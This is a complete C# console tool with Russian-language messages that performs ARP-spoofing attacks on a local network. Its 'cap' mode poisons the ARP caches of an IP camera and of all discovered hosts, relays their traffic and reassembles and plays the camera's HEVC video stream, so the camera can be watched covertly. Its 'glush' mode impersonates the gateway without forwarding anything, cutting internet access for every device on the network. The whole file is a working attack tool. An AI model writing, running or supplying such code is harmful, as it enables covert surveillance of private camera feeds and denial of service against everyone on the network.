using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketDotNet;

class MiniCam
{
    static string camIp;
    static LibPcapLiveDevice dev;
    static PhysicalAddress myMac, camMac, gwMac;
    static IPAddress myIp;
    static string subnet, gwIp;
    static readonly Dictionary<IPAddress, PhysicalAddress> viewerMac = new Dictionary<IPAddress, PhysicalAddress>();
    static volatile bool running = true;
    static Stream outp;
    static long rawBytes, vidBytes, captured, toUs, fwd, arpSent;

    class Flow { public uint next; public bool started; public SortedDictionary<uint, byte[]> pend = new SortedDictionary<uint, byte[]>(); public List<byte> box = new List<byte>(); }
    static readonly Dictionary<string, Flow> flows = new Dictionary<string, Flow>();
    static string showFlow;
    static DateTime lastVidTime;
    static bool synced;

    static string logPath = "consoleapp_log.txt";
    static void Log(string s) { Console.WriteLine(s); try { File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss") + "  " + s + "\r\n"); } catch { } }

    static void Main(string[] a)
    {
        try { logPath = Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "consoleapp_log.txt"); } catch { }
        if (a.Length > 0 && a[0] == "glush") { Glush(); return; }
        if (a.Length > 0 && a[0] == "cap") { Cap(a.Length > 1 ? a[1] : "192.168.1.11"); return; }
        Console.WriteLine("Запуск:\n  dotnet run cap <ip камеры>   — перехват видео камеры\n  dotnet run glush             — обрыв интернета всей точки");
    }

    static void NetInfo()
    {
        foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (ni.OperationalStatus != OperationalStatus.Up) continue;
            var p = ni.GetIPProperties();
            string gw = null;
            foreach (var g in p.GatewayAddresses)
                if (g.Address.AddressFamily == AddressFamily.InterNetwork && g.Address.ToString() != "0.0.0.0") { gw = g.Address.ToString(); break; }
            if (gw == null) continue;
            foreach (var u in p.UnicastAddresses)
                if (u.Address.AddressFamily == AddressFamily.InterNetwork) { myIp = u.Address; break; }
            if (myIp != null) { gwIp = gw; string s = myIp.ToString(); subnet = s.Substring(0, s.LastIndexOf('.') + 1); break; }
        }
    }

    static LibPcapLiveDevice PickDevice(IPAddress ip)
    {
        foreach (LibPcapLiveDevice d in LibPcapLiveDeviceList.Instance)
            foreach (var addr in d.Addresses)
                if (addr.Addr != null && addr.Addr.ipAddress != null && addr.Addr.ipAddress.Equals(ip)) return d;
        return LibPcapLiveDeviceList.Instance[0];
    }

    static void Scan()
    {
        Parallel.For(1, 255, new ParallelOptions { MaxDegreeOfParallelism = 64 }, i =>
        {
            string s = subnet + i;
            if (s == myIp.ToString() || s == camIp || s == gwIp) return;
            var addr = IPAddress.Parse(s);
            var m = new ARP(dev).Resolve(addr);
            if (m != null) lock (viewerMac) viewerMac[addr] = m;
        });
    }

    static void Snd(byte[] b) { try { dev.SendPacket(b); } catch { } }

    static void SendArp(PhysicalAddress ethDst, PhysicalAddress sndMac, IPAddress sndIp, PhysicalAddress tgtMac, IPAddress tgtIp)
    {
        var reply = new ArpPacket(ArpOperation.Response, tgtMac, tgtIp, sndMac, sndIp);
        Snd(new EthernetPacket(sndMac, ethDst, EthernetType.Arp) { PayloadPacket = reply }.Bytes);
        var req = new ArpPacket(ArpOperation.Request, tgtMac, tgtIp, sndMac, sndIp);
        Snd(new EthernetPacket(sndMac, ethDst, EthernetType.Arp) { PayloadPacket = req }.Bytes);
        arpSent += 2;
    }

    static bool Before(uint a, uint b) { return (int)(a - b) < 0; }

    static Stream StartFfplay()
    {
        var p = new Process();
        p.StartInfo.FileName = "ffplay";
        p.StartInfo.Arguments = "-fflags +genpts+discardcorrupt -err_detect ignore_err -flags low_delay -f hevc -i -";
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        return p.StandardInput.BaseStream;
    }

    static void Cap(string ip)
    {
        camIp = ip;
        NetInfo();
        dev = PickDevice(myIp);
        dev.Open(DeviceModes.Promiscuous, 100);
        myMac = dev.MacAddress;
        Log("Запуск перехвата камеры " + camIp + ". Адаптер: " + (dev.Name ?? "?") + ", мой MAC " + myMac + ".");
        camMac = new ARP(dev).Resolve(IPAddress.Parse(camIp));
        if (camMac == null) { Log("Камера " + camIp + " не отвечает, выхожу."); return; }
        gwMac = new ARP(dev).Resolve(IPAddress.Parse(gwIp));
        Log("Камера " + camIp + " (" + camMac + "), шлюз " + gwIp + " (" + gwMac + "), я " + myIp + ".");
        Scan();
        Log("Устройств в сети: " + viewerMac.Count + ".");
        new Thread(SpoofLoop) { IsBackground = true }.Start();
        dev.OnPacketArrival += OnPacket;
        dev.StartCapture();
        Console.WriteLine("Перехват пошёл. Видео откроется само. Enter — стоп.");
        Console.ReadLine();
        running = false;
        dev.StopCapture();
        RestoreArp();
        Log("Стоп. Видео " + (vidBytes / 1024) + " КБ, поймано " + captured + ", нам " + toUs + ", переслано " + fwd + ", ARP " + arpSent + ".");
        Console.WriteLine("\nСтоп. Сеть восстановлена. Лог: " + logPath);
    }

    static void OnPacket(object s, PacketCapture e)
    {
        captured++;
        var eth = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data) as EthernetPacket;
        if (eth == null) return;
        if (myMac != null && eth.DestinationHardwareAddress.Equals(myMac)) toUs++;
        var ip = eth.Extract<IPv4Packet>();
        if (ip == null) return;
        var tcp = eth.Extract<TcpPacket>();
        if (tcp != null && ip.SourceAddress.ToString() == camIp && tcp.SourcePort == 3001
            && tcp.PayloadData != null && tcp.PayloadData.Length > 0)
        {
            string f = ip.DestinationAddress + ":" + tcp.DestinationPort;
            rawBytes += tcp.PayloadData.Length;
            Flow fl;
            if (!flows.TryGetValue(f, out fl)) { fl = new Flow(); flows[f] = fl; }
            AddSegF(fl, tcp.SequenceNumber, tcp.PayloadData);
            DeframeF(f, fl);
        }
        Forward(eth, ip);
    }

    static void Forward(EthernetPacket eth, IPv4Packet ip)
    {
        if (!eth.DestinationHardwareAddress.Equals(myMac)) return;
        PhysicalAddress tgt = null;
        if (ip.DestinationAddress.ToString() == camIp) tgt = camMac;
        else viewerMac.TryGetValue(ip.DestinationAddress, out tgt);
        if (tgt == null) tgt = gwMac;
        if (tgt == null) return;
        eth.SourceHardwareAddress = myMac;
        eth.DestinationHardwareAddress = tgt;
        Snd(eth.Bytes);
        fwd++;
    }

    static void AddSegF(Flow fl, uint seq, byte[] data)
    {
        if (data.Length == 0) return;
        if (!fl.started) { fl.started = true; fl.next = seq; }
        if (Before(seq, fl.next)) return;
        if (!fl.pend.ContainsKey(seq)) fl.pend[seq] = data;
        byte[] d;
        while (fl.pend.TryGetValue(fl.next, out d)) { fl.box.AddRange(d); fl.pend.Remove(fl.next); fl.next += (uint)d.Length; }
        if (fl.pend.Count > 1500)
        {
            foreach (var k in fl.pend.Keys) { fl.next = k; break; }
            while (fl.pend.TryGetValue(fl.next, out d)) { fl.box.AddRange(d); fl.pend.Remove(fl.next); fl.next += (uint)d.Length; }
        }
    }

    static void DeframeF(string f, Flow fl)
    {
        var box = fl.box; int i = 0, n = box.Count;
        while (i + 28 <= n)
        {
            if (box[i] != 0xF1 || box[i + 1] != 0xF5 || box[i + 2] != 0xEA) { i++; continue; }
            int len = box[i + 14] | (box[i + 15] << 8);
            if (len < 28) { i++; continue; }
            if (i + len > n) break;
            if (box[i + 3] == 0xF9)
            {
                vidBytes += len - 28;
                if (showFlow == null || (f != showFlow && (DateTime.Now - lastVidTime).TotalSeconds > 2))
                {
                    showFlow = f; synced = false;
                    if (outp == null) { outp = StartFfplay(); Console.WriteLine("\nВидео пошло (" + f + "), жду ключевой кадр..."); }
                }
                if (f == showFlow && outp != null)
                {
                    lastVidTime = DateTime.Now;
                    var seg = box.GetRange(i + 28, len - 28).ToArray();
                    try
                    {
                        if (synced) outp.Write(seg, 0, seg.Length);
                        else { int k = FindKeyStart(seg); if (k >= 0) { synced = true; outp.Write(seg, k, seg.Length - k); Console.WriteLine("\nКлючевой кадр пойман, показываю."); } }
                    }
                    catch { }
                }
            }
            i += len;
        }
        if (i > 0) box.RemoveRange(0, i);
    }

    static int FindKeyStart(byte[] p)
    {
        for (int k = 0; k + 5 < p.Length; k++)
        {
            bool sc3 = p[k] == 0 && p[k + 1] == 0 && p[k + 2] == 1;
            bool sc4 = p[k] == 0 && p[k + 1] == 0 && p[k + 2] == 0 && p[k + 3] == 1;
            if (!sc3 && !sc4) continue;
            int nal = sc3 ? k + 3 : k + 4;
            if (nal >= p.Length) break;
            int t = (p[nal] >> 1) & 0x3F;
            if (t == 32 || t == 33) return k;
        }
        return -1;
    }

    static void SpoofLoop()
    {
        var cam = IPAddress.Parse(camIp);
        var bc = new PhysicalAddress(new byte[] { 255, 255, 255, 255, 255, 255 });
        while (running)
        {
            foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
            {
                SendArp(kv.Value, myMac, cam, kv.Value, kv.Key);
                SendArp(camMac, myMac, kv.Key, camMac, cam);
            }
            SendArp(bc, myMac, cam, bc, cam);
            Status();
            for (int i = 0; i < 10 && running; i++) Thread.Sleep(100);
        }
    }

    static void RestoreArp()
    {
        var cam = IPAddress.Parse(camIp);
        foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
            for (int i = 0; i < 3; i++)
            {
                SendArp(kv.Value, camMac, cam, kv.Value, kv.Key);
                SendArp(camMac, kv.Value, kv.Key, camMac, cam);
                Thread.Sleep(40);
            }
    }

    static void Status()
    {
        if (camMac == null) return;
        string line = "Камера " + camIp + ": видео " + (vidBytes / 1024) + " КБ, NVS " + (rawBytes / 1024) + " КБ, поймано " + captured + ", нам " + toUs + ", переслано " + fwd + ", ARP " + arpSent;
        Console.Write("\r" + line + "   ");
        try { File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss") + "  " + line + "\r\n"); } catch { }
    }

    static void Glush()
    {
        NetInfo();
        dev = PickDevice(myIp);
        dev.Open(DeviceModes.Promiscuous, 100);
        myMac = dev.MacAddress;
        var gw = IPAddress.Parse(gwIp);
        gwMac = new ARP(dev).Resolve(gw);
        if (gwMac == null) { Log("Шлюз " + gwIp + " не отвечает, выхожу."); return; }
        Log("Запуск глушилки. Адаптер: " + (dev.Name ?? "?") + ".");
        Log("Я " + myIp + " (" + myMac + ") и шлюз " + gwIp + " (" + gwMac + ") не трогаю.");
        Scan();
        bool selfIn = false, gwIn = false;
        foreach (var kv in viewerMac) { if (kv.Key.ToString() == myIp.ToString()) selfIn = true; if (kv.Key.ToString() == gwIp) gwIn = true; }
        Log("Целей: " + viewerMac.Count + ". Я в списке? " + (selfIn ? "да (!)" : "нет") + ". Шлюз в списке? " + (gwIn ? "да (!)" : "нет") + ".");
        foreach (var kv in viewerMac) Log("Цель " + kv.Key + " (" + kv.Value + ").");
        Log("Начинаю глушить: подменяю MAC шлюза " + gwIp + " на свой " + myMac + " (без пересылки). Enter — стоп.");
        Console.WriteLine("Глушу " + viewerMac.Count + " устройств. Enter — стоп.");
        var sw = Stopwatch.StartNew();
        new Thread(() =>
        {
            int round = 0;
            while (running)
            {
                foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
                {
                    SendArp(kv.Value, myMac, gw, kv.Value, kv.Key);
                    SendArp(gwMac, myMac, kv.Key, gwMac, gw);
                }
                round++;
                Log("Глушу: раунд " + round + ", целей " + viewerMac.Count + ", ARP " + arpSent + ", прошло " + (int)sw.Elapsed.TotalSeconds + " с.");
                for (int i = 0; i < 10 && running; i++) Thread.Sleep(100);
            }
        }) { IsBackground = true }.Start();
        Console.ReadLine();
        running = false;
        Log("Стоп. Чиню сеть, рассылаю настоящий MAC шлюза...");
        foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
            for (int i = 0; i < 3; i++) { SendArp(kv.Value, gwMac, gw, kv.Value, kv.Key); SendArp(gwMac, kv.Value, kv.Key, gwMac, gw); Thread.Sleep(40); }
        Log("Готово. Сеть восстановлена. Всего ARP отправлено: " + arpSent + ". Лог: " + logPath);
        Console.WriteLine("Стоп. Сеть восстановлена.");
    }
}
